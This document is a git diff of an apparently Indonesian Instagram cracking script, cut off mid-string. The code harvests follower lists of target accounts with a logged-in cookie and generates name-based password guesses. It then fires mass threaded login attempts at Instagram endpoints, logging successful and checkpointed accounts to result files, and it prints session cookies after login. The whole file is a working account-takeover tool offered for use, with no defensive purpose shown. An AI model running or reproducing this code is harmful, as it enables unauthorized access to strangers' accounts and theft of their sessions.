@@ -1,33 +1,46 @@
-import base64
-import re, os, sys, json, bs4, uuid, hmac, hashlib, urllib, urllib.request, calendar, requests, random, datetime, time
-from time import sleep
-from datetime import datetime
+import urllib.parse
+from urllib.parse import quote
+import re, os, sys, json, random, urllib, urllib.request, hmac, hashlib, time, string, uuid, requests, base64,datetime,subprocess
 from concurrent.futures import ThreadPoolExecutor
-from requests.exceptions import ConnectionError
-from rich.panel import Panel
-from rich.tree import Tree
-from rich import print as prints
+import requests,bs4,json,os,sys,random,datetime,time,re
+from bs4 import BeautifulSoup as bsp
 from rich.console import Console
-from rich.table import Table
-from rich import print as cetak
-from rich.panel import Panel as nel
-from rich.table import Table as me
-from rich.columns import Columns
+from rich.panel import Panel 
+from rich import print as prints
+import threading
 from rich.console import Console as sol
-console = Console()
-from concurrent.futures import ThreadPoolExecutor as Modol
-from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
-
-Uid, Uuid = [], []
-internal,external,success,checkpoint,loop,following=[],[],[],[],0,[]
-method, xxkontol, Meledakcik, proxxy = [], [], [], []
-ugen=[]
-s = requests.Session()
-day = datetime.now().strftime("%d-%b-%Y")
-nyMnD, nyMxD, menudump, = 5, 10, []
-current_GMT = time.gmtime(time.time())
-bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
-
+import time
+from rich.table import Table as me
+import datetime
+from rich.columns import Columns
+from rich.progress import Progress,TextColumn,SpinnerColumn
+from string import *
+xyz=[]
+# Define color codes for output styling
+B = '\x1b[1;94m'  # BLUE
+U = '\x1b[1;95m'  # PURPLE
+O = '\x1b[1;96m'  # LIGHT BLUE
+N = '\x1b[0m'     # RESET
+H = "\033[0;92m"   # GREEN
+K = "\033[0;93m"   # YELLOW
+M = '\x1b[1;91m'   # RED
+P = "\033[0m"      # WHITE
+P = "\033[97m"
+I = "\033[30m"
+A = "\033[90m"
+H = "\033[32m"
+K = "\033[33m"
+M, K2 = K, K
+P = '\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\x1b[1;91m' #RED +
+k = '\033[93m' # KUNING +
+H = '\x1b[1;92m' # HIJAU +
+h = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+B = '\x1b[1;94m'
 class Colors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -82,24 +95,55 @@ SKY     = "#87afff" # SKY BLUE
 ORNG   = "#d78700" # ORANGE3
 ORCH   = "#ff5fff" # MEDIUM ORCH
 
+ses = requests.Session()
 X_IG_APP_ID = random.choice(["936619743392459" , "2763362503905702" , "1217981644879628"])
 IG_API = 'https://i.instagram.com/api/v1/'
 IG_URL = 'z.p42.www.instagram.com'
 HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': X_IG_APP_ID,'x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
+headers_log = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    'Accept': 'application/json, text/javascript, */*; q=0.01',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'X-Requested-With': 'XMLHttpRequest',
+    'Content-Type': 'application/x-www-form-urlencoded',
+}
 
-def waktu():
-	now = datetime.now()
-	hours = now.hour
-	if 4 <= hours < 12:timenow = "Selamat Pagi"
-	elif 12 <= hours < 15:timenow = "Selamat Siang"
-	elif 15 <= hours < 18:timenow = "Selamat Petang"
-	else:timenow = "Selamat Malam"
-	return timenow
-#------------------[ CLEAR-LAYAR ]-------------------#
-def clear():
-    try:os.system("	clear")
-    except:pass
+xx = 0
+rr = random.randint;rc = random.choice
+console = Console()
+Uid, Uuid , Uuid4= [], [], []
+Ok, Cp, Loop = 0, 0, 0
+getuserid = 'https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'
+HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': '1217981644879628','x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
+ua = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
+userinfo  = 'https://i.instagram.com/api/v1/users/{id!s}/info/'
 
+try:cek_data = requests.get("http://ip-api.com/json/").json()
+except:cek_data = {'-'}
+try:asal_kota = cek_data["city"]
+except:asal_kota = {'-'}
+try:asal_reg = cek_data["region"]
+except:asal_reg = cek_data['-']
+try:times = cek_data["timezone"]
+except:times = cek_data['-']
+try:city = cek_data["city"]
+except:city = cek_data['-']
+
+dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
+tgl = datetime.datetime.now().day
+bln = dic[str(datetime.datetime.now().month)]
+thn = datetime.datetime.now().year
+Okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
+Cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
+
+def generate_random_ua():
+    devices = ['Android', 'iPhone', 'Windows']
+    os_version = random.choice(['10', '11', '12'])
+    device_type = random.choice(devices)
+    browser_version = random.randint(40, 100)
+    ua = f"Mozilla/5.0 ({device_type}; {os_version} OS) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{browser_version}.0.0.0 Mobile Safari/537.36"
+    return ua
 
 def InstaIgeh():
     rr = random.randint
@@ -148,131 +192,178 @@ def aguss():
     ya = random.choice([hir, asep4,asep5, asep10, asep6, asep7, asep8, asep9, v1, v2, v3, v4,ua_rmx,ua_oppo])
     return ya
 
-def LoginCuyy():
+def Aset_Ig():
     os.system('clear')
-    Tabel1 = f"{H2}01\n02"
-    Tabel2 = f"{P2} Login Menggunakan Cookie ( {H2}Recommended{P2} )\nKeluar ({M2} Tools{P2}"
-    Tabel3 = f"{H2}ON\n{H2}ON"
-    ColumnTabel = me()
-    ColumnTabel.add_column(f"{P2}NO", style="bold green", justify='center')
-    ColumnTabel.add_column(f"{P2}PILIHAN", style="bold green", justify='center',width=55)
-    ColumnTabel.add_column(f"{P2}STATUS", style="bold green", justify='center')
-    ColumnTabel.add_row(Tabel1,Tabel2, Tabel3)
-    sol().print(ColumnTabel, justify='center',style=f"bold green")
-    LoginMenu = input(f"└──╭➣  Pilih 1 Sampai 5 : ")
-    if LoginMenu in [""]:
-        prints(Panel(f"{P2}Harap Masukan Pilihan Yang Bener Jangan Sampai Salah!",width=80,padding=(0,12),style=f"bold green"));time.sleep(3);LoginCuyy()
-    elif LoginMenu in ["1","01"]:
-        loginCookie()
-    elif LoginMenu in ["2","02"]:
-        exit()
+    if os.path.isfile('.Cokies-IG.txt') is True:
+        coki = {'cookie': open('.Cokies-IG.txt', 'r').read()}
     else:
-        prints(Panel(f"{P2}Harap Masukan Pilihan Yang Bener Jangan sampai Salah!",width=80,padding=(0,12),style=f"bold green"));time.sleep(3);LoginCuyy()
-
-def loginCookie():
+        Tabel1 = f"{H2}01\n02\n03"
+        Tabel2 = f"{P2} Login Menggunakan Cookie ( {H2}Recommended{P2} )\nLogin Menggunakan Usernama Dan Password ( {H2}Recommended{P2} )\nKeluar ({M2} Tools{P2}"
+        Tabel3 = f"{H2}ON\n{H2}ON\n{H2}ON"
+        ColumnTabel = me()
+        ColumnTabel.add_column(f"{P2}NO", style="bold green", justify='center')
+        ColumnTabel.add_column(f"{P2}PILIHAN", style="bold green", justify='center',width=55)
+        ColumnTabel.add_column(f"{P2}STATUS", style="bold green", justify='center')
+        ColumnTabel.add_row(Tabel1,Tabel2, Tabel3)
+        sol().print(ColumnTabel, justify='center',style=f"bold green")
+        LoginMenu = input(f"└──╭➣  Pilih 1 Sampai 3 : ")
+        if LoginMenu in [""]:
+            prints(Panel(f"{P2}Harap Masukan Pilihan Yang Bener Jangan Sampai Salah!",width=80,padding=(0,12),style=f"bold green"));time.sleep(3)
+        elif LoginMenu in ["1","01"]:
+            raraky = {'cookie':input("\ncookie: ")}
+            if raraky['cookie'] == 'res':
+                coki = {'cookie':find_res()}
+            else:
+                coki = raraky
+        elif LoginMenu in ["2","02"]:
+            username = input(f'└──╭➣ {H}Masukan Username :{H} ')
+            password = input(f'└──╭➣ {H}Masukan Password :{H} ')
+            login_to_instagram(username, password)
+        elif LoginMenu in ["3","03"]:
+            exit()
+        else:
+            prints(Panel(f"{P2}Harap Masukan Pilihan Yang Bener Jangan sampai Salah!",width=80,padding=(0,12),style=f"bold green"));time.sleep(3)
     try:
-        kuki=open('.kukis.txt','r').read()
-    except FileNotFoundError:
-        prints(Panel(f"{P2}Sebelum Login Pastikan Akun Tumbal Bersifat Publik Dan Tidak Private",width=80,padding=(0,4),style=f"bold green"))
-        username = input(f'└──╭➣ {H}Masukan Username :{H} ')
-        cookies =input(f'{P}└──╭➣ {H}Masukan Cookie   :{H} ')
-        kuki = open('.kukis.txt','w').write(cookies)
-        user = open('.username.txt','w').write(username)
-        time.sleep(2)
-        prints(Panel(f"{P2}Login Akun Tumbal Berhasil, Silahkan Jalankan Ulang Scriptnya",width=80,padding=(0,7),style=f"bold green"));exit()
-        try:
-            check = s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':kuki},headers={"user-agent":InstaIgeh(),"x-ig-app-id":'1217981644879628'}) # 936619743392459 , 2763362503905702 , 1217981644879628
-            informasi = check.json()["data"]["user"]
-            nama = informasi["full_name"]
-            followers = informasi["edge_followed_by"]["count"]
-            following = informasi["edge_follow"]["count"]
-            external.append(f'{nama}|{followers}|{following}')
-        except  (ValueError,KeyError):
-            prints(Panel(f"{P2}opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.",width=80,style=f"bold green"));os.system('rm -rf .kukis.log rm -rf .username');exit()
-        return external,user
-    
-def Menu():
-    tabel1 = "01\n02\n03\n04\n05"
+        uid = re.search(r'ds_user_id=(\d+)', str(coki['cookie'])).group(1)
+        req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki).json()
+        if 'user' in req:
+            req = req['user']
+            open('.Cokies-IG.txt', 'w').write(f'{coki["cookie"]}')
+            full_name = req['full_name']
+            username = req['username']
+            follower_count = req['follower_count']
+            following_count = req['following_count']
+            media_count = req['media_count']
+            return coki, full_name, username, follower_count, following_count, media_count
+        else:
+            os.system('rm -rf .Cokies-IG.txt')
+            print(f" {M}cookies Invalid Gunakan Cookies yang Lain!")
+            time.sleep(3)
+            return None, None, None, None, None, None  
+    except Exception as e:
+        os.system('rm -rf .Cokies-IG.txt')
+        print(f" {M}cookies Invalid Gunakan Cookies yang Lain!")
+        time.sleep(3)
+        return None, None, None, None, None, None 
+
+
+def login_to_instagram(username, password):
+    url = 'https://www.instagram.com/accounts/login/ajax/'
+    response = ses.get('https://www.instagram.com/accounts/login/', headers=headers_log)
+    csrf_token = response.cookies.get('csrftoken')
+    login_headers = {
+        'User-Agent': generate_random_ua(),
+        'X-CSRFToken': csrf_token,
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'X-Requested-With': 'XMLHttpRequest',
+        'Referer': 'https://www.instagram.com/accounts/login/',
+    }
+
+    data = {
+        'username': username,
+        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1605155817:{password}',  # Format the password with timestamp
+    }
+    login_response = ses.post(url, headers=login_headers, data=data, cookies={'csrftoken': csrf_token})
+    if login_response.status_code == 200 and 'authenticated' in login_response.json() and login_response.json()['authenticated']:
+        x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s" % username, headers={"user-agent": generate_random_ua(), "x-ig-app-id": '936619743392459'})
+        usres = ses.get('https://www.instagram.com/push/web/get_push_info').json()['data']['user_id']
+        x_json = x.json()["data"]["user"]
+        pengikut = x_json["edge_followed_by"]["count"]
+        mengikut = x_json["edge_follow"]["count"]
+        postingan = x_json["edge_owner_to_timeline_media"]["count"]
+        cookie = ";".join([key + "=" + value.replace('"', '') for key, value in ses.cookies.get_dict().items()])
+        print(f"\n{B}{username} {password}{N}")
+        print(f"{H}Followers: {O}{pengikut}{N}")
+        print(f"{H}Posts: {O}{postingan}{N}")
+        print(f"{H}Following: {O}{mengikut}{N}")
+        print(f"{B}Cookies:{N}\n{P}{cookie}{N}")
+        print(f"{H}Login successful!{N}")
+        print(f"{H}User ID Akun: {O}{usres}{N}")
+    else:
+        prints(Panel(f"{P2}opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.",width=80,style=f"bold green"));os.system('rm -rf .kukis.txt');exit()
+        return False
+        
+
+def menu():
+    os.system('clear')
+    aset, full_name, username, fol, following, media = Aset_Ig()
+    if aset is None:
+        time.sleep(3)
+        return
+    os.system('clear')
+    tabel1 = "01\n02\n00"
     tabel2 = (
-        "Crack Dari Pengikut\nCrack Dari Mengikuti\nLihat Akun Hasil Crack\nKeluar"
+        "Crack Dari Pengikut\nCrack Dari Mengikuti\nGanti Cookie"
     )
-    tabel3 = "ON\nON\nON\nON"
+    tabel3 = "ON\nON\nON"
     colume_tabel = me()
     colume_tabel.add_column("NO", style="bold green", justify='center')
     colume_tabel.add_column("PILIHAN", style="bold green", justify='center', width=55)
     colume_tabel.add_column("STATUS", style="bold green", justify='center')
     colume_tabel.add_row(tabel1, tabel2, tabel3)
     sol().print(colume_tabel, justify='center', style="bold green")
-    choice = input('└──╭➣ Pilih 1 Sampai 4: ')
-    if choice == '':
-        prints("Pilih Yang Benar, Jangan Kosong!")
-        time.sleep(3)
+    x = input('└──╭➣ Pilih 1 Sampai 3: ')
+    if x in ['01','1']:
+        dumps(aset, True)
+    elif x in ['02','2']:
+        dumps(aset, False)
+    elif x in ['00','0']:
+        os.system('rm -rf /sdcard/.Cokies-IG.txt')
+        print("berhasil menghapus cookies")
         exit()
-    elif choice in ('1', '01'):
-        dumps(True)
-    elif choice in ('2', '02'):
-        dumps(False)
-    elif choice in ('3', '03'):
-        print('')
-        for i in os.listdir('result'):
-            prints(Panel(f"Hasil Crack {i}",width=80,style=f"bold green"))
-            c = input(f'└──╭➣ Masukan Nama File : ')
-            g = open("result/%s"%(c)).read().splitlines()
-            print(f' Total Results : {H}{len(g)}[bold white]')
-            prints(Panel(f"{P2}Proses Mengecek Status Akun. Silahkan Tunggu Sampai Proses Cek Selesai",width=80,style=f"bold green"))
-            for s in g:
-                usr = s.split("|")[0]
-                pwd = s.split("|")[1]
-            checkAPI(usr,pwd)
-            prints(Panel(f"{P2}Proses Cek Akun Selesai, Silahkan Jalankan Ulang Scriptnya python run.py",width=80,padding=(0,3),style=f"bold green"))
-    elif choice in ('4', '04'):
-        exit()
-    else:
-        Menu()
-        
-def dumps(typess,xyz = []):
-    kuki = open('.kukis.txt','r').read()
-    if 'csrftoken' not in str(kuki):
-        try:
-            memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = kuki).json()
-            token = memek['config']['csrf_token']
-            kuki['cookie'] +=';csrftoken=%s;'%(token)
-        except Exception as e:
-            os.system('rm -rf .kukis.txt')
-            prints(Panel.fit(f"[bold red] Csrftoken tidak tersedia, dump tidak akan berjalan: {e} [bold white]"))
-            exit()
-    prints(Panel.fit(f"[bold green] Masukkan Username Instagram, Tekan CTRL+C Jika Ingin Berhenti Dump [bold white]"))
-    users = input("username : ").split(',')
-    try:
-        for y in users:
-            req = requests.get(f'https://www.instagram.com/{y}/', cookies = kuki).text
-            uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
-            if uid not in xyz:xyz.append(uid)
-    except:pass
-    try:
-        mode = 'followers' if typess is True else 'following'
-        for kintil in xyz:
-            if typess is True:
-                Graphql(True, kintil, kuki, '')
-            else:
-                Graphql(False, kintil, kuki, '')
-    except:pass
-    print("")
-    passwordAPI()
-    
-def Graphql(typess, userid, cokie,after):
+
+def dumps(kuki, typess, xyz=[]):
+	if 'csrftoken' not in str(kuki):
+		try:
+			memek = requests.get('https://www.instagram.com/data/shared_data/', cookies=kuki).json()
+			token = memek['config']['csrf_token']
+			kuki['cookie'] += ';csrftoken=%s;' % (token)
+		except:
+			os.system('rm -rf .Cokies-IG.txt')
+			exit()
+	print(f" \n{b}[{P}●{b}]{P} Your Targets Usernames")         
+	users = input(f'    {b}＼{P} Targets User : {b}').split(',')
+	print(f" \n{b}[{P}●{b}]{P} Process Collecting Username")         
+	threads = []
+	for y in users:
+		thread = threading.Thread(target=process_user, args=(y, kuki, typess, xyz))
+		threads.append(thread)
+		thread.start()
+	for thread in threads:
+		thread.join()
+	print("")
+	Metode()
+
+def process_user(user, kuki, typess, xyz):
+	req = requests.get(f'https://www.instagram.com/{user}/', cookies=kuki).text
+	match = re.search(r'"user_id":"(\d+)"', str(req))
+	if match:
+		uid = match.group(1)
+		if uid not in xyz:
+			xyz.append(uid)
+		mode = 'followers' if typess is True else 'following'
+		Graphql(typess, uid, kuki['cookie'], '')
+
+def Graphql(typess, userid, cokie, after):
 	global xx
 	api = "https://www.instagram.com/graphql/query/"
-	csr = 'variables={"id":"%s","first":24,"after":"%s"}'%(userid,after)
+	csr = 'variables={"id":"%s","first":24,"after":"%s"}' % (userid, after)
 	mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
 	try:
-		ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
+		ptk = {
+			"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+			"cookie": cokie
+		}
 		req = requests.get(api, params=mek, headers=ptk).json()
 		if 'require_login' in req:
 			if len(Uuid) > 0:
 				pass
 			else:
-				exit(f'\n{P}[{K2}!{P}] Invalid Cookie')
+				exit(f'\n{B}[{b}●{B}]{M} Invalid Cookie')
 		khm = 'edge_followed_by' if typess is True else 'edge_follow'
 		for xyz in req['data']['user'][khm]['edges']:
 			username = xyz['node']['username']
@@ -280,60 +371,93 @@ def Graphql(typess, userid, cokie,after):
 			if xy not in Uuid:
 				xx += 1
 				Uuid.append(xy)
-				print('\rMengumpulkan Uid {}{}{}                            '.format(M, len(Uuid), P), end='')
-				time.sleep(0.0009)
+				print(f'\r    {b}＼{P} Collected ID : {b}{len(Uuid)}', end='')
 		end = req['data']['user'][khm]['page_info']['has_next_page']
 		if end is True:
 			after = req['data']['user'][khm]['page_info']['end_cursor']
 			Graphql(typess, userid, cokie, after)
-		else:pass
-	except:pass
+	except:
+		pass
 
-def passwordAPI():
-    global SistemLog
-    prints(Panel(f"[[bold cyan]01[bold white]] Methode Api Nonce www.instagram.com \n[[bold cyan]02[bold white]] Methode Api i.instagtam.com\n[[bold cyan]03[bold white]] Methode Api i.instagtam.com [ Threads ] ",padding=(0,7),style=f"bold green"))
-    u = input(f'└──╭➣ Pilih 1 Dan 3 : ')
-    if u in ["1","01"]:
-        SistemLog = "apinonce"
-    elif u in ["2","02"]:
-        SistemLog = "api"
-    elif u in ["3","03"]:
-        SistemLog = "threads"
-    else:
-        SistemLog = "threads"
-    CrackStart()
-        
-def CrackStart():
-    prints(Panel.fit(f"[bold green]Crack Sedang Berlangsung. Jika Tidak Ada Hasil Hidupkan Mode Pesawat 5 detik"))
-    with ThreadPoolExecutor (max_workers=30) as ASF:
-        for i in Uuid:
-            try:
-                username, name = i.split('|')
-                kontol = Password(name)
-                if SistemLog == "apinonce":
-                    ASF.submit(Crack_i, username, kontol)
-                elif SistemLog == "api":
-                    ASF.submit(Crack_w, username, kontol)
-                elif SistemLog == "threads":
-                    ASF.submit(Crack_x, username, kontol)
-            except:pass
-    prints(Panel.fit(f"[bold green]Crack Telah Selesai"))
-    exit()
 
+def Metode(): 
+	global Login_Dengan
+	print(f" \n{b}[{P}●{b}] {P}Your Choice Login Menthod ")
+	print(f'    {b}1{P}. Login Instagram With Metode ({b}WEBS{P}) ')
+	print(f'    {b}2{P}. Login Instagram With Metode ({b}APPS{P}) ')
+	print(f'    {b}3{P}. Login Instagram With Metode ({b}AJAX{P}) ')
+	method = input(f'{b}     ╰─{P}›{b} ')
+	if method in ['01','1']: Login_Dengan = "api.instagram.com"
+	elif method in ['02','2']: Login_Dengan = "i.instagram.com"
+	elif method in ['03','3']: Login_Dengan = "www.instagram.com"
+	else:Login_Dengan = "api.instagram.com"
+	SetCrack()
+
+def SetCrack():
+	print(f" \n{b}[{P}●{b}]{P} Result Save In ")
+	print(f'    {b}＼{P}.RESULTS-INSTAGRAM/{b}{Okc}')
+	print(f'    {b}＼{P}.RESULTS-INSTAGRAM/{b}{Cpc}')
+	print(f" \n{b}[{P}●{b}]{P} Crack Process Begins Turn Off Airplane Mode Every{b} 500 ID\n ")
+	with ThreadPoolExecutor (max_workers=30) as ASF:
+		for i in Uuid:
+			try:
+				username, name = i.split('|')
+				kontol = Password(name)
+				if Login_Dengan == "api.instagram.com":
+					ASF.submit(Crack_api, username, kontol)
+				elif Login_Dengan == "i.instagram.com":
+					ASF.submit(Crack_i, username, kontol)
+				elif Login_Dengan == "www.instagram.com":
+					ASF.submit(crack_ajax, username, kontol)
+			except:pass
+	exit(' \n\n Crack Telah Selesai')
+	
 def Password(name):
-    xxzx= []
-    for nama in name.split(' '):
-        nama = nama.lower()
-        if len(nama) <3: continue
-        elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:xxzx.append(nama+'12');xxzx.append(nama+'321');xxzx.append(nama+'123');xxzx.append(nama+'1234');xxzx.append(nama+'12345');xxzx.append(nama+'123456');xxzx.append(nama+'12345789');xxzx.append(nama+'01');xxzx.append(nama+'04');xxzx.append(nama+'05');xxzx.append(nama+'07');xxzx.append(nama+'08');xxzx.append(nama+'09');xxzx.append(nama+'15');xxzx.append(nama+'17');xxzx.append(nama+'18');xxzx.append(nama+'19');xxzx.append(nama+'24');xxzx.append(nama+'28')
-        else:xxzx.append(nama+'12');xxzx.append(nama+'321');xxzx.append(nama+'123');xxzx.append(nama+'1234');xxzx.append(nama+'12345');xxzx.append(nama+'123456');xxzx.append(nama+'12345789');xxzx.append(nama+'01');xxzx.append(nama+'04');xxzx.append(nama+'05');xxzx.append(nama+'07');xxzx.append(nama+'08');xxzx.append(nama+'09');xxzx.append(nama+'15');xxzx.append(nama+'17');xxzx.append(nama+'18');xxzx.append(nama+'19');xxzx.append(nama+'24');xxzx.append(nama+'28')
-    return(xxzx)
-    
+	xxzx = []
+	full = name.replace('_', ' ').replace('.', ' ').replace('@', ' ')
+	for nama in full.split(' '):
+		if len(nama) < 3: 
+			continue
+		base_nama = nama.replace(' ', '').capitalize()
+		xxzx.append(base_nama)
+		xxzx.append(base_nama + '01')
+		xxzx.append(base_nama + '02')
+		xxzx.append(base_nama + '03')
+		xxzx.append(base_nama + '04')
+		xxzx.append(base_nama + '05')
+		xxzx.append(base_nama + '06')
+		xxzx.append(base_nama + '07')
+		xxzx.append(base_nama + '08')
+		xxzx.append(base_nama + '09')
+		xxzx.append(base_nama + '10')
+		if len(nama) >= 4:
+			xxzx.append(base_nama + '12')        	
+			xxzx.append(base_nama + '123')
+			xxzx.append(base_nama + '1234')
+			xxzx.append(base_nama + '12345')
+			xxzx.append(base_nama + '123456')
+		else:
+			xxzx.append('kamu nanya')
+			xxzx.append('sayangku123')
+			xxzx.append('Bengkulu')
+	return xxzx
+
+def convert_cookie(item):
+	try:
+		sesid = 'sessionid=' + re.findall(r'sessionid=(\d+)', str(item))[0]
+		ds_id = 'ds_user_id=' + re.findall(r'ds_user_id=(\d+)', str(item))[0]
+		csrft = 'csrftoken=' + re.findall(r'csrftoken=(.*?);', str(item))[0]
+		donez = '%s;%s;%s;ig_nrcb=1;dpr=2'%(ds_id, sesid, csrft)
+	except Exception as e:
+		donez = 'cookies tidak di temukan, error saat convert'
+	return donez
+
+ses = requests.Session()
 def data_target(name):
 	for y in name.split(','):
 		try:
-			HEADERS.update({'user-agent'  : 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)','x-ig-app-id' :X_IG_APP_ID})
-			profil_info_target = s.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers = HEADERS).json()['data']['user']
+			HEADERS.update({'user-agent'  : 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)','x-ig-app-id' :'1217981644879628'})
+			profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers = HEADERS).json()['data']['user']
 			post      = profil_info_target["edge_owner_to_timeline_media"]["count"]
 			peng  = profil_info_target["edge_followed_by"]["count"]
 			meng = profil_info_target["edge_follow"]["count"]
@@ -345,305 +469,307 @@ def data_target(name):
 			post, peng, meng, mail, fullname, fbid, phone = None, None, None, None, None,  None, None
 	return post, peng, meng, mail, fullname, fbid, phone
 
-def Crack_i(username, memek):
-    global Ok, Cp, Loop
-    sys.stdout.write(f"\r{Colors.BOLD}[Instagram App]{Colors.ENDC} {Colors.OKCYAN}[Proses: {Loop}/{len(Uuid)}/{Colors.OKCYAN}{str(username)[:6]}]{Colors.ENDC} Success: {Colors.OKGREEN}{Ok}{Colors.ENDC} Checkpoint: {Colors.WARNING}{Cp}{Colors.ENDC}"),
-    sys.stdout.flush()
-    for password in memek:
-        try:
-            ses = requests.Session()
-            useragent = InstaIgeh()
-            device_id = str(uuid.uuid4())
-            _hash = hashlib.md5()
-            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
-            hex_ = _hash.hexdigest()
-            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
-            data = {'signed_body': 'aa792afa7c0f5b1680531edb1681750fcc45a3718142c399d2420291431be7f1.{"id":"'+str(device_id)+'","server_config_retrieval":"1","experiments":"ig_android_fci_onboarding_friend_search,ig_android_device_detection_info_upload,ig_android_sms_retriever_backtest_universe,ig_android_direct_add_direct_to_android_native_photo_share_sheet,ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_account_identity_logged_out_signals_global_holdout_universe,ig_android_login_identifier_fuzzy_match,ig_android_reliability_leak_fixes_h1_2019,ig_android_video_render_codec_low_memory_gc,ig_android_push_fcm,ig_android_show_login_info_reminder_universe,ig_android_email_fuzzy_matching_universe,ig_android_one_tap_aymh_redesign_universe,ig_android_direct_send_like_from_notification,ig_android_suma_landing_page,ig_android_direct_main_tab_universe,ig_android_login_forgot_password_universe,ig_android_session_scoped_logger,ig_android_smartlock_hints_universe,ig_android_account_switch_infra_universe,ig_android_video_ffmpegutil_pts_fix,ig_android_multi_tap_login_new,ig_android_caption_typeahead_fix_on_o_universe,ig_android_save_pwd_checkbox_reg_universe,ig_android_nux_add_email_device,ig_username_suggestions_on_username_taken,ig_android_analytics_accessibility_event,ig_android_ingestion_video_support_hevc_decoding,direct_app_deep_linking_universe,ig_android_account_recovery_auto_login,ig_android_feed_cache_device_universe2,ig_android_sim_info_upload,ig_android_mobile_http_flow_device_universe,ig_account_recovery_via_whatsapp_universe,ig_android_hide_fb_button_when_not_installed_universe,ig_android_targeted_one_tap_upsell_universe,ig_android_gmail_oauth_in_reg,ig_android_native_logcat_interceptor,ig_android_hide_typeahead_for_logged_users,ig_android_vc_interop_use_test_igid_universe,ig_android_reg_modularization_universe,ig_android_phone_edit_distance_universe,ig_android_device_verification_separate_endpoint,ig_android_universe_noticiation_channels,ig_smartlock_login,ig_